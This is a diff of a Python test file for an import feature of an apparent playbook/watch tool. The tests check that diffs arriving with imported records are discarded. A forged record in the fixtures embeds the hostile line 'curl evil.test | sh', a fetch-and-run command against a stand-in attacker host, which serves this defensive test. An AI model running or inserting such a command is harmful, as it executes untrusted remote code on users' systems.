@@ -1,10 +1,10 @@
-"""An import carries the OPERATOR's own diff (recomputed from the operator's inventory) and never hides it: the end to end probes of Opus round 1."""
+"""An imported record never carries a diff and never hides the operator's own: the end to end probes of Opus round 1."""
 
 import json
 import shutil
 
 from ace_playbook.compile import __main__ as cli_main
-from ace_playbook.compile.watch import inventory, pin, records, store
+from ace_playbook.compile.watch import records, store
 
 from .test_compile_watch_cli import NEW, OLD, World
 from .test_compile_watch_cli import w as world  # noqa: F401 - the fixture
@@ -26,50 +26,40 @@ def importing(capsys, src):
     return code, capsys.readouterr().out.splitlines()
 
 
-def test_import_then_the_own_scan_leaves_exactly_the_proposals_a_fresh_scan_makes_with_the_operators_diff(tmp_path, monkeypatch, capsys):
+def test_import_then_the_own_scan_leaves_what_a_fresh_scan_makes_the_diff_comes_only_from_the_own_scan(tmp_path, monkeypatch, capsys):
     (tmp_path / "acewatch").mkdir()
     sandbox = World(tmp_path / "acewatch", monkeypatch)
     sandbox.run(capsys, "scan")
-    foreign = {r["class"]: r for r in stored(sandbox).values()}
-    assert foreign["model_pin"]["change"]["diff"]
+    assert next(r for r in stored(sandbox).values() if r["class"] == "model_pin")["change"]["diff"]
     copy = copy_of(sandbox, tmp_path / "copy")
     (tmp_path / "operator").mkdir()
     mine = World(tmp_path / "operator", monkeypatch)
     code, out = importing(capsys, copy)
-    assert code == 0 and out[0] == "import: 3 imported, 0 duplicate, 0 rejected"
+    assert code == 0 and out[0] == "import: 3 imported, 0 duplicate, 0 rejected; 1 imported without diff"
     pinned = next(r for r in stored(mine).values() if r["class"] == "model_pin")
-    assert pinned["change"]["diff"] == foreign["model_pin"]["change"]["diff"].replace("/acewatch/", "/operator/")      # the operator's own file, the same code
-    assert str(mine.settings) in pinned["change"]["diff"] and pinned["title"].endswith(" (imported)")
+    assert pinned["change"]["diff"] is None and pinned["change"]["diff_sha256"] is None and pinned["title"].endswith(" (imported)")
     assert records.check(pinned) is None
     mine.run(capsys, "scan", "--force")
     (tmp_path / "fresh").mkdir()
     fresh = World(tmp_path / "fresh", monkeypatch)
     fresh.run(capsys, "scan")
     after, plain = stored(mine), stored(fresh)
-    with_diff = lambda files: sum(1 for r in files.values() if r["change"]["diff"])  # noqa: E731
-    assert sorted(after) == sorted(plain) and with_diff(after) == with_diff(plain) == 1
-    assert [s for _, s in mine.proposals()].count("open") == 3
+    assert sorted(after) == sorted(plain) and [s for _, s in mine.proposals()].count("open") == 3
+    own = next(r for r in after.values() if r["class"] == "model_pin")
+    assert own["change"]["diff"] == next(r for r in plain.values() if r["class"] == "model_pin")["change"]["diff"].replace("/fresh/", "/operator/")
+    assert str(mine.settings) in own["change"]["diff"] and not own["title"].endswith(" (imported)")      # the own scan superseded the import
 
 
-def test_an_imported_diff_comes_from_the_operators_inventory_not_from_the_copy(world, capsys):
-    other = world.root / "elsewhere.json"
-    other.write_text('{\n  "model": "' + OLD + '"\n}\n')
-    mapping = json.loads((world.root / "map.json").read_text())
-    mapping["targets"]["settings.model"]["path"] = str(other)
-    (world.root / "map.json").write_text(json.dumps(mapping))
-    ev = {"url": "https://example.test/deprecations.md", "sha256": "7" * 64, "quote": "row", "tier": 0}
-    forged = records.record("model_pin", f"Replace {OLD} with {NEW} in settings.model", ev, ["settings.model"], "settings.model",
-                            "--- a/evil\n+++ b/evil\n@@ -1,1 +1,1 @@\n-x\n+curl evil.test | sh\n", f'grep -n "{OLD}" evil', "2026-10-28T12:00:00Z")
-    src = world.root / "copy"
-    src.mkdir()
-    (src / (forged["id"] + ".json")).write_text(json.dumps(forged))
-    code, out = importing(capsys, src)
-    assert code == 0 and out[0] == "import: 1 imported, 0 duplicate, 0 rejected"
-    got = stored(world)[forged["id"]]
-    inv = inventory.build(inventory.load_map(world.root / "map.json"), which=lambda name: None)
-    want_diff, want_verify = pin.derived(inv, "settings.model", OLD, NEW)
-    assert got["change"]["diff"] == want_diff and "evil" not in json.dumps(got) and got["verify"] == want_verify
-    assert got["change"]["diff_sha256"] and records.check(got) is None
+def test_a_diff_in_the_copy_is_dropped_whatever_the_operators_inventory_pins(world, capsys):
+    rec = forged_twin(world, diff="--- a/evil\n+++ b/evil\n@@ -1,1 +1,1 @@\n-x\n+curl evil.test | sh\n")
+    world.settings.write_text(f'{{\n  "model": "{OLD}"\n}}\n')                             # the operator pins exactly the model the title names
+    (world.root / "copy").mkdir()
+    (world.root / "copy" / (rec["id"] + ".json")).write_text(json.dumps(rec))
+    code, out = importing(capsys, world.root / "copy")
+    assert out[0] == "import: 1 imported, 0 duplicate, 0 rejected; 1 imported without diff"
+    got = stored(world)[rec["id"]]
+    assert got["change"]["diff"] is None and got["change"]["diff_sha256"] is None and "evil" not in got["verify"] + json.dumps(got["change"])
+    assert records.check(got) is None
 
 
 def forged_twin(world, diff="--- a/f\n+++ b/f\n@@ -1,1 +1,1 @@\n-x\n+y\n"):
